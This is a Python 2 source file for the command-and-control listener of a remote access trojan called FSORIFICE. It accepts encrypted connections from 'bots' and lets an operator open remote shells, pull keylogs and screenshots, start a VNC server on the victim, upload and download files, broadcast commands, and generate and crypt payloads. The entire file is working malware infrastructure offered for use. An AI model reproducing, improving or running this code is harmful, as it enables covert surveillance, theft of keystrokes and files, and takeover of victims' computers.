from config.conf                  import conf_client
from interface.console            import ui_console
from modules.network.file_handler import f_handler
from modules.network.crypto.AES   import tcp_cipher
from modules.network.crypto.RSA   import key_cipher
from payload.fsplgen              import fso_generator
from payload.fsplcrypt            import fso_crypter
import re
import os
import sys
import time
import socket
import select
import atexit
import cPickle
import termcolor
import threading


class fso_listener(object):

    def __init__(self):
        # define some global variables.
        self.CONNECTION_LIST  = []
        self.SESSIONKEY_LIST  = []
        self.HOSTINFO_LIST    = []
        self.RECV_BUFFER_SIZE = 2048
        self.CLIENT_SIZE      = 0
        self.CLIENT_INDEX     = 0
        self.RECEIVING_FILE   = False
        self.STARTED_UP       = False
        self.CONFIG_PATH      = 'config/config.conf'

        # create instances for our modules.
        self._ui_console      = ui_console()
        self._conf_client     = conf_client()
        self._file_handler    = f_handler()
        self._keyutil         = key_cipher()
        self._cipher          = tcp_cipher()
        self._fsplgen         = fso_generator()
        self._fsplcrypt       = fso_crypter()

        # define text color and attrs.
        self.console_menu     = termcolor.colored("[menu@FSORIFICE] > ", "blue", attrs = ["bold"])
        self.console_sessions = termcolor.colored("[sessions@FSORIFICE] > ", "green", attrs = ["bold"])


    def onExit(self, server_socket):
        # on_exit handler code here.
        print '[*] Ceaning up...'
        server_socket.shutdown(socket.SHUT_RDWR)
        server_socket.close()


    def send_command(self, clientsocket, command, session_key):
        command = self._cipher.encrypt(command, session_key)
        command = command.encode("UTF-8")

        # try to send message and detect if the bot is dead.
        try:
            clientsocket.send(command)
        except:
            try:
                print "\n[-] Possible dead bots detected. Removed from the list."

                # get the index of the socket and delete its aeskey and hostname.
                self.index_tmp = self.CONNECTION_LIST.index(clientsocket)-1
                del self.SESSIONKEY_LIST[self.index_tmp]
                del self.HOSTINFO_LIST[self.index_tmp]
                clientsocket.close()
                self.CONNECTION_LIST.remove(clientsocket)
                self.CLIENT_SIZE -= 1
            except:
                pass


    def broadcast_command(self, command):
        #Do not send the message to master socket (server).
        if self.CLIENT_SIZE > 0:
            self._ui_console.note("[*] Broadcasting command '%s' to all bots." % command)
            for self.socket in self.CONNECTION_LIST:
                if self.socket != self.CONNECTION_LIST[0]:
                    try:
                        # get the index of the socket in order to retrieve its key from the list.
                        self.index_tmp = self.CONNECTION_LIST.index(self.socket)-1
                        self.send_command(self.socket, command, self.SESSIONKEY_LIST[self.index_tmp])
                    except :
                        try:
                            print "\n[-] Possible dead bots detected. Removed from the list."
                            del self.SESSIONKEY_LIST[self.index_tmp]
                            del self.HOSTINFO_LIST[self.index_tmp]
                            self.socket.close()
                            self.CONNECTION_LIST.remove(self.socket)
                            self.CLIENT_SIZE -= 1
                        except:
                            pass
        else:
            print "[-] You have currently no bots connected back. (Try updating the list)"


    def command_handler(self, server_socket, sid):
        if self.CLIENT_SIZE > 0:
            if sid > 0 and sid < len(self.CONNECTION_LIST):
                self._ui_console.note("[*] Session Opened with sid %d at %s" % (sid, time.strftime("%X")))

                while True:
                    try:
                        time.sleep(0.8)

                        # read from user input.
                        try:
                            self._ui_console.session("[%s, %s] >>" % self.CONNECTION_LIST[sid].getpeername())
                        except:
                            print "[-] The bot might have disconnected. type 'exit' to abort current session."
                            try:
                                # get the index of the socket and delete its aeskey and hostname.
                                self.index_tmp = self.CONNECTION_LIST.index(self.CONNECTION_LIST[sid])-1
                                del self.SESSIONKEY_LIST[self.index_tmp]
                                del self.HOSTINFO_LIST[self.index_tmp]
                                self.CONNECTION_LIST[sid].close()
                                self.CONNECTION_LIST.remove(self.CONNECTION_LIST[sid])
                                self.CLIENT_SIZE -= 1
                            except:
                                pass

                        self.sc_userinput = raw_input()
                        try:
                            self.sc_main = self.sc_userinput.split('@')[0]
                            self.tmp     = self.sc_userinput.split('@')[1]
                            self.sc_arg1 = self.tmp.split(',')[0]
                            self.sc_arg2 = self.tmp.split(',')[1]
                        except:
                            pass

                        if self.sc_userinput == "":
                            continue

                        elif self.sc_userinput == "help":
                            self._ui_console.print_session_help()

                        elif self.sc_userinput == "exit":
                            raise KeyboardInterrupt

                        elif self.sc_userinput == "background":
                            raise KeyboardInterrupt

                        elif self.sc_main == "admin/shell_exec":
                            self.send_command(self.CONNECTION_LIST[sid], self.sc_userinput, self.SESSIONKEY_LIST[sid-1])

                        elif self.sc_userinput == "admin/interactive_shell":
                            while True:
                                time.sleep(1)
                                self.is_command = raw_input('$ ')
                                if self.is_command == '':
                                    continue
                                elif self.is_command == 'exit':
                                    break
                                else:
                                    self.send_command(self.CONNECTION_LIST[sid], "admin/shell_exec@" + self.is_command, self.SESSIONKEY_LIST[sid-1])

                        elif self.sc_userinput == "gather/keylogger":
                            self.klog_filename = self._conf_client.KLOGPATH + "klog-" + str(time.strftime("%X")) + ".txt"
                            print "[*] Saving keylog to default path: %s" % self.klog_filename
                            self.RECEIVING_FILE = True
                            self.send_command(self.CONNECTION_LIST[sid], self.sc_userinput, self.SESSIONKEY_LIST[sid-1])
                            self._file_handler.download(self.CONNECTION_LIST[sid], self.klog_filename, self.SESSIONKEY_LIST[sid-1])
                            self.RECEIVING_FILE = False

                        elif self.sc_main == "gather/keylogger":
                            print "[*] Saving keylog to: %s" % self.sc_arg1
                            self.RECEIVING_FILE = True
                            self.send_command(self.CONNECTION_LIST[sid], self.sc_userinput, self.SESSIONKEY_LIST[sid-1])
                            self._file_handler.download(self.CONNECTION_LIST[sid], self.sc_arg2, self.SESSIONKEY_LIST[sid-1])
                            self.RECEIVING_FILE = False

                        elif self.sc_userinput == "gather/screenshot":
                            self.scrn_filename = self._conf_client.SCRNPATH + "screenshot-" + str(time.strftime("%X")) + ".jpg"
                            print "[*] Saving screenshot to default path: %s" % self.scrn_filename
                            self.RECEIVING_FILE = True
                            self.send_command(self.CONNECTION_LIST[sid], self.sc_userinput, self.SESSIONKEY_LIST[sid-1])
                            self._file_handler.download(self.CONNECTION_LIST[sid], self.scrn_filename, self.SESSIONKEY_LIST[sid-1])
                            self.RECEIVING_FILE = False

                        elif self.sc_main == "gather/screenshot":
                            print "[*] Saving screenshot to: %s" % self.sc_arg1
                            self.RECEIVING_FILE = True
                            self.send_command(self.CONNECTION_LIST[sid], self.sc_userinput, self.SESSIONKEY_LIST[sid-1])
                            self._file_handler.download(self.CONNECTION_LIST[sid], self.sc_arg2, self.SESSIONKEY_LIST[sid-1])
                            self.RECEIVING_FILE = False

                        elif self.sc_main == "gather/vncserver":
                            if self.sc_arg1 == "start":
                                print "[*] Starting VNC Server on %s:8080\n" % (self.CONNECTION_LIST[sid].getpeername()[0])
                                self.send_command(self.CONNECTION_LIST[sid], self.sc_userinput, self.SESSIONKEY_LIST[sid-1])
                            elif self.sc_arg1 == "stop":
                                print "[*] Stopping VNC Server on remote host.\n"
                                self.send_command(self.CONNECTION_LIST[sid], self.sc_userinput, self.SESSIONKEY_LIST[sid-1])

                        elif self.sc_main == "manage/download":
                            self.RECEIVING_FILE = True
                            self.send_command(self.CONNECTION_LIST[sid], self.sc_userinput, self.SESSIONKEY_LIST[sid-1])
                            self._file_handler.download(self.CONNECTION_LIST[sid], self.sc_arg2, self.SESSIONKEY_LIST[sid-1])
                            self.RECEIVING_FILE = False

                        elif self.sc_main == "manage/upload":
                            self.send_command(self.CONNECTION_LIST[sid], self.sc_userinput, self.SESSIONKEY_LIST[sid-1])
                            self._file_handler.upload(self.CONNECTION_LIST[sid], self.sc_arg1, self.SESSIONKEY_LIST[sid-1])

                        elif self.sc_main == "troll/popup_msg":
                            print "[*] Displaying popup messagebox on the remote host.\n"
                            self.send_command(self.CONNECTION_LIST[sid], self.sc_userinput, self.SESSIONKEY_LIST[sid-1])

                        else:
                            # send the command to the remote system.
                            self.send_command(self.CONNECTION_LIST[sid], self.sc_userinput, self.SESSIONKEY_LIST[sid-1])

                    # confirm whether the user wants to abort current session.
                    except KeyboardInterrupt:
                        self.choice = raw_input("[*] Do you want to abort current session? (You may come back later)(Y/n): ")

                        if self.choice == "Y":
                            print "[-] Current session aborted as user requested.\n"
                            break

                        elif self.choice == "n":
                            print
                            continue

                        else:
                            self._ui_console.log("[!] Error: Invalid Option.")
                            print
                            continue
            else:
                self._ui_console.log("[!] Error. The specified client does not exist.")
        else:
            print "[-] You have currently no bots connected back. (Try updating the list)\n"


    def list_clients(self):
        self._ui_console.note("[+] Updating connected client...")
        self.CLIENT_SIZE  = 0
        self.CLIENT_INDEX = 1

        if len(self.CONNECTION_LIST) < 2:
            print "[-] You have currently no bots connected back. (Try updating the list)\n"
        else:
            for self.target_sock in self.CONNECTION_LIST:
                if self.target_sock != self.CONNECTION_LIST[0]:
                    try:
                        # print hostname, ip, port, and client version.
                        print "(%i) %s\t" % (self.CLIENT_INDEX, self.HOSTINFO_LIST[self.CONNECTION_LIST.index(self.target_sock)-1][:-5]),
                        print "(%s, %s)\t" % self.target_sock.getpeername(),
                        print "(ver%s)" % self.HOSTINFO_LIST[self.CONNECTION_LIST.index(self.target_sock)-1][-5:]
                        self.CLIENT_SIZE  += 1
                        self.CLIENT_INDEX += 1

                    except:
                        try:
                            print "\n[-] Possible dead bots detected. Removed from the list."
                            # get the index of the socket and delete its aeskey and hostname.
                            self.index_tmp = self.CONNECTION_LIST.index(self.socket)-1
                            del self.SESSIONKEY_LIST[self.index_tmp]
                            del self.HOSTINFO_LIST[self.index_tmp]
                            self.socket.close()
                            self.CONNECTION_LIST.remove(self.socket)
                            self.CLIENT_INDEX += 1

                        except:
                            self.CLIENT_INDEX += 1
        print


    def listener_menu(self):
        while True:
            try:
                time.sleep(0.5)
                self.lm_userinput = raw_input("{}".format(self.console_sessions))

                try:
                    self.lm_main = self.lm_userinput.split(' ')[0]
                    self.lm_arg1 = self.lm_userinput.split(' ')[1]
                    self.lm_arg2 = self.lm_userinput.split(' ')[2]
                except:
                    pass

                if self.lm_userinput == "":
                    pass

                elif self.lm_userinput == "help":
                    self._ui_console.print_listener_help()

                elif self.lm_userinput == "clear":
                    self._ui_console.clear()

                elif self.lm_userinput == "exit":
                    raise KeyboardInterrupt

                elif self.lm_main == "info":
                    if self.lm_userinput == "info":
                        self._ui_console.print_module_help('info')
                    elif self.lm_arg1 == "-h":
                        self._ui_console.print_module_help('info')
                    else:
                        try:
                            self.send_command(self.CONNECTION_LIST[int(self.lm_arg1)], "info", self.SESSIONKEY_LIST[self.lm_arg1-1])
                        except:
                            self._ui_console.print_module_help('info')

                elif self.lm_main == "sessions":
                    if self.lm_userinput == "sessions":
                        self._ui_console.print_module_help('sessions')
                    elif self.lm_arg1 == "-h":
                        self._ui_console.print_module_help('sessions')
                    elif self.lm_arg1 == "-l":
                        # list all connected client(s).
                        self.list_clients()
                    elif self.lm_arg1 == "-i":
                        try:
                            # run this function to actually interact with specific client(s).
                            self.command_handler(self.server_socket, int(self.lm_arg2))
                        except Exception, self.e:
                            self._ui_console.print_module_help('sessions')
                            print self.e
                    else:
                        self._ui_console.print_module_help('sessions')

                elif self.lm_main == "broadcast":
                    if self.lm_userinput == "broadcast":
                        self._ui_console.print_module_help('broadcast')
                    elif self.lm_arg1 == "-h":
                        self._ui_console.print_module_help('broadcast')
                    else:
                        try:
                            self.broadcast_command(self.lm_arg1)
                        except:
                            self._ui_console.print_module_help('broadcast')

                elif self.lm_main == "read":
                    if self.lm_userinput == "read":
                        self._ui_console.print_module_help('read')
                    elif self.lm_arg1 == "-h":
                        self._ui_console.print_module_help('read')
                    else:
                        try:
                            with open(self.lm_arg2) as f:
                                self.command_list = f.readlines()
                                self.command_list = [self.lines.strip('\n') for self.lines in self.command_list]
                            for self.command in self.command_list:
                                self.send_command(self.CONNECTION_LIST[int(self.lm_arg1)], self.command, self.SESSIONKEY_LIST[self.lm_arg1-1])
                        except:
                            self._ui_console.print_module_help('read')

                else:
                    self._ui_console.log("[-] Error: Invalid Option.")

            except KeyboardInterrupt:
                self.choice = raw_input("[*] Return to main menu? (You may come back later) (Y/n):")

                if self.choice == "Y":
                    print "[-] Returning to main menu as user requested.\n"
                    print
                    self._ui_console.clear()
                    self.display_mainmenu()
                    break

                elif self.choice == "n":
                    print
                    continue

                else:
                    self._ui_console.log("[-] Error: Invalid Option.")
                    continue


    def listen(self):
        # create server socket instance and set it to be reusable.
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        # set on_exit task. perform some cleanup.
        atexit.register(self.onExit, self.server_socket)

        # bind and listen, setting backlog to 10.
        self.server_socket.bind((self._conf_client.LHOST, self._conf_client.LPORT))
        self.server_socket.listen(10)

        # Add server socket to the list of readable connections
        self._ui_console.note("[+] Server started on %s:%d with transport ssl at %s" % (self._conf_client.LHOST, self._conf_client.LPORT, time.strftime("%X")))
        print "type 'help' for more instructions.\n"
        self.CONNECTION_LIST.append(self.server_socket)
        self.STARTED_UP = True

        # create a thread to detect new clients.
        self.thd_handshake = threading.Thread(target=self.handshake_handler, args=(self.server_socket,))
        self.thd_handshake.start()
        self.listener_menu()


    # the function to receive new connections and receive responses from old connections.
    def handshake_handler(self, server_socket):
        while True:
            try:
                # get the list sockets which are ready to be read through select.
                self.read_sockets, self.write_sockets, self.error_sockets = select.select(self.CONNECTION_LIST, [], [])

                for self.sock in self.read_sockets:

                    # new connection.
                    if self.sock == server_socket:
                        # handle the case in which there is a new connection recieved through server_socket.
                        # do not further process the connection if the handshake message is incorrect.
                        sockfd, addr  = server_socket.accept()
                        handshake_msg = sockfd.recv(16)

                        # perform an ssl handshake.
                        if handshake_msg != 'SSL Hello':
                            sockfd.close()
                        else:
                            # respond with ssl certificate, inclusive of 'ssl done' and pubkey.
                            sockfd.send('SSL Hello done')
                            sockfd.send(cPickle.dumps(self.session_pubkey))

                            # receive session aeskey and decrypt it with session private key.
                            self.received_aeskey = sockfd.recv(128)
                            self.current_aeskey = self._keyutil.decrypt(self.received_aeskey)

                            # receive client info, then add the socket, hostinfo and aeskey to their lists.
                            hostinfo = sockfd.recv(32)
                            self.CONNECTION_LIST.append(sockfd)
                            self.SESSIONKEY_LIST.append(self.current_aeskey)
                            self.HOSTINFO_LIST.append(hostinfo)
                            self.CLIENT_SIZE += 1

                            print "[+] New connection from %s" % hostinfo[:-5],
                            print " (%s, %s) " % addr,
                            print "with ver%s" % hostinfo[-5:]

                    # some incoming message from a bot.
                    else:
                        # data recieved from bot, process it.
                        try:
                            if self.RECEIVING_FILE:
                                # if the incoming data is a file, don't process it!
                                # wait for 5 secs and see if the file_handler has done its work.
                                # if not, sleeping another round ;)
                                time.sleep(5)

                            else:
                                # in Windows, sometimes when a TCP program closes abruptly,
                                # a "Connection reset by peer" exception will be thrown.
                                self.data = self.sock.recv(self.RECV_BUFFER_SIZE)
                                try:
                                    self.data = self.data.decode("UTF-8")
                                except Exception, self.e:
                                    print self.e

                                # get the index of the socket in order to retrieve its aeskey from the list.
                                self.index_tmp = self.CONNECTION_LIST.index(self.sock)-1
                                self.data = self._cipher.decrypt(self.data, self.SESSIONKEY_LIST[self.index_tmp])

                                # print bot response.
                                if self.data:
                                    print self.data,
                                    print "- from_src: (%s,%s)" % self.sock.getpeername()

                        # bot disconnected, so remove from socket list.
                        except Exception, self.e:
                            try:
                                print self.e
                                print "[-] The bot (%s, %s) has disconnected.\n" % addr
                                del self.SESSIONKEY_LIST[self.index_tmp]
                                del self.HOSTINFO_LIST[self.index_tmp]
                                self.sock.close()
                                self.CONNECTION_LIST.remove(self.sock)
                                self.CLIENT_SIZE -= 1
                            except:
                                pass
                            continue
            except Exception, self.e:
                self._ui_console.log("[!] Error: %s" % str(self.e))

        server_socket.close()


    def menu_loop(self):
        # display banner.
        self.display_mainmenu()

        # enter main menu loop.
        while True:
            try:
                self.choice = raw_input("{}".format(self.console_menu))

                if self.choice == "0":
                    # show current values of the parameters.
                    self._conf_client.print_conf()

                elif self.choice == "1":
                    # parameters configuration.
                    self._conf_client.configure()
                    print

                elif self.choice == "2":
                    if self.STARTED_UP is False:
                        try:
                            self.listen()
                        except Exception, self.e:
                            self._ui_console.log("[!] %s, close the process using port 443." % str(self.e))
                    else:
                        self.listener_menu()

                elif self.choice == "3":
                    self._fsplgen.Start(self._conf_client.get_RHOST(), self._conf_client.get_RPORT(), self._conf_client.get_DROPNAME())

                elif self.choice == "4":
                    self._fsplcrypt.Start()

                elif self.choice == "5":
                    self._ui_console.print_about()

                elif self.choice == "99":
                    self._ui_console.confirm_exit("quit FSORIFICE")

                else:
                    continue

            except KeyboardInterrupt:
                print
                self._ui_console.confirm_exit("quit FSORIFICE")


    def display_mainmenu(self):
        self._ui_console.print_banner()
        self._ui_console.print_mainmenu()

    def Start(self):
        # clear screen upon startup.
        self._ui_console.clear()

        # read from config file first.
        self._conf_client.load_config(self.CONFIG_PATH)

        # generate session keypair.
        self.session_pubkey = self._keyutil.generate_rsa_keypair()
        self._ui_console.note("[+] Generated session credentials.")

        # enter menu loop.
        self.menu_loop()


# create a new listener instance and start it.
_fsorifice_listener = fso_listener()
_fsorifice_listener.Start()
